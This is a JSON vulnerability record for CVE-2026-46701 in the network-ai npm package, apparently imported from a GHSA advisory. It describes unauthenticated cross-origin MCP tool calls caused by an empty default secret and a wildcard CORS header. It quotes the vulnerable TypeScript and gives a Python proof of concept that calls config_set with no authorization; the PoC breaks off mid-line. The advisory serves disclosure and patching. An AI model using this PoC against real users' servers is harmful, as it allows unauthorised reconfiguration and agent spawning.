@@ -1,0 +1,54 @@
+{
+  "schema_version": "0.1.0",
+  "id": "AGT-2026-0226",
+  "modified": "2026-07-08T08:29:24.200115859Z",
+  "published": "2026-05-21T22:39:59Z",
+  "aliases": [
+    "GHSA-j3vx-cx2r-pvg8",
+    "CVE-2026-46701"
+  ],
+  "summary": "Network-AI: Unauthenticated Cross-Origin MCP Tool Invocation via Empty Default Secret",
+  "details": "# Unauthenticated Cross-Origin MCP Tool Invocation via Empty Default Secret\n\n| Field            | Value |\n| ---------------- | ----- |\n| Repository       | Jovancoding/Network-AI |\n| Affected version | v5.4.4 (commit c12686e181f231cf8d7bcf836a96d78f0f0877ac) |\n\n## Summary\n\nThe MCP SSE server defaults to an empty secret (`process.env['NETWORK_AI_MCP_SECRET'] ?? ''` at `bin/mcp-server.ts:89`), which causes `_isAuthorized` (`lib/mcp-transport-sse.ts:254`) to return `true` unconditionally for every request — no `Authorization` header is required. Simultaneously, `_handleRequest` sets `Access-Control-Allow-Origin: *` (`lib/mcp-transport-sse.ts:272`) on every response, so a cross-origin browser fetch can read the result without restriction. An unauthenticated attacker who can lure a user to a malicious web page can invoke all 22 exposed MCP tools — including `config_set`, `agent_spawn`, and `blackboard_write` — against a default-configured localhost server.\n\n## Affected Code\n\n`bin/mcp-server.ts:89` — default secret resolves to empty string, enabling open access\n\n```typescript\n    secret: process.env['NETWORK_AI_MCP_SECRET'] ?? '',\n```\n\n`lib/mcp-transport-sse.ts:254` — auth guard short-circuits to `true` when secret is falsy\n\n```typescript\n  private _isAuthorized(req: http.IncomingMessage): boolean {\n    if (!this._opts.secret) return true;\n    const authHeader = req.headers['authorization'];\n    if (typeof authHeader !== 'string') return false;\n    const parts = authHeader.split(' ');\n    return parts[0]?.toLowerCase() === 'bearer' && parts[1] === this._opts.secret;\n  }\n```\n\n`lib/mcp-transport-sse.ts:272` — wildcard CORS header applied unconditionally before any auth check\n\n```typescript\n  private _handleRequest(req: http.IncomingMessage, res: http.ServerResponse): void {\n    // CORS — allow any MCP client to connect\n    res.setHeader('Access-Control-Allow-Origin', '*');\n    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');\n    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');\n```\n\n`lib/mcp-transport-sse.ts:367-368` — authenticated path dispatches parsed JSON-RPC frame directly to `handleRPC` with no further caller validation\n\n```typescript\n        const rpc = JSON.parse(body) as McpJsonRpcRequest;\n        const response = await this._bridge.handleRPC(rpc);\n```\n\nAny cross-origin browser request reaches `handleRPC` because `_isAuthorized` returns `true` (empty secret) and the `Access-Control-Allow-Origin: *` header lets the browser expose the response to the calling script.\n\n## Proof of Concept\n\n**Environment**\n- Network-AI v5.4.4 (latest)\n- Docker container bound to `127.0.0.1:3001`\n- Python 3 + `requests`\n\n**poc.py**\n```python\nimport sys\nimport requests\n\nBASE = \"http://127.0.0.1:3001\"\n\n# Step 1: Verify CORS wildcard (simulating cross-origin preflight)\npreflight = requests.options(\n    f\"{BASE}/mcp\",\n    headers={\n        \"Origin\": \"http://evil.example.com\",\n        \"Access-Control-Request-Method\": \"POST\",\n        \"Access-Control-Request-Headers\": \"Content-Type\",\n    },\n)\nacao = preflight.headers.get(\"Access-Control-Allow-Origin\", \"\")\nprint(f\"[*] OPTIONS /mcp -> {preflight.status_code}, Access-Control-Allow-Origin: {acao!r}\")\nif acao != \"*\":\n    print(f\"RESULT: FAIL — expected ACAO='*', got {acao!r}\")\n    sys.exit(1)\n\n# Step 2: Invoke config_set with NO Authorization header from cross-origin\nrpc_payload = {\n    \"jsonrpc\": \"2.0\",\n    \"id\": 1,\n    \"method\": \"tools/call\",\n    \"params\": {\n        \"name\": \"config_set\",\n        \"arguments\": {\n            \"key\": \"maxParallelAgents\",\n            \"value\": \"999\"\n        }\n    }\n}\nresp = requests.post(\n    f\"{BASE}/mcp\",\n    json=rpc_payload,\n    headers={\n        \"Content-Type\": \"application/json\",\n        \"Origin\": \"http://evil.example.com\",\n        # No Authorization header — exploiting empty-secret bypass\n    },\n)\nprint(f\"[*] POST /mcp (no auth, cross-origin) -> {resp.status_code}\")\nprint(f\"[*] Response body: {resp.text[:800]}\")\nresp_acao = re\n\nImported from OSV GHSA-j3vx-cx2r-pvg8.",
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://osv.dev/vulnerability/GHSA-j3vx-cx2r-pvg8"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Jovancoding/Network-AI/security/advisories/GHSA-j3vx-cx2r-pvg8"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/Jovancoding/Network-AI"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "network-ai"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "5.4.5"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "database_specific": {
+    "artifact_type": "package",
+    "classification": "vulnerable",
+    "verification": "verified",
+    "reporter": "osv-import",
+    "severity": "high"
+  }
+}
